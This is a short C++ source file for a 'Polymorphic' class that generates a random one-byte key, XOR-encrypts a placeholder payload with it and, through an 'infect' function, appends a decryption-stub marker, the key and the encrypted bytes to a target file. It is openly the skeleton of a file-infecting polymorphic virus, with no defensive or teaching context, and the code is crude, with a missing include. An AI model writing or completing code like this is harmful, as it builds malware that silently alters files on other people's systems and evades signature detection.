#include <fstream>
#include <sstream>
#include "Polymorphic.h"

std::string Polymorphic::generateKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 255);
    return std::to_string(dis(gen));
}

std::string Polymorphic::encryptPayload(const std::string &payload, const std::string &key) {
    std::string encrypted;
    for (char c : payload) {
        encrypted += c ^ std::stoi(key);
    }
    return encrypted;
}

void Polymorphic::infect(const std::string &filePath) {
    std::string key = generateKey();
    std::string payload = "// Polymorphic payload\n";
    std::string encrypted = encryptPayload(payload, key);
    std::string stub = "// DECRYPTION_STUB: " + key + "\n" + encrypted;
    std::fstream file(filePath, std::ios::app);

    file << stub;
}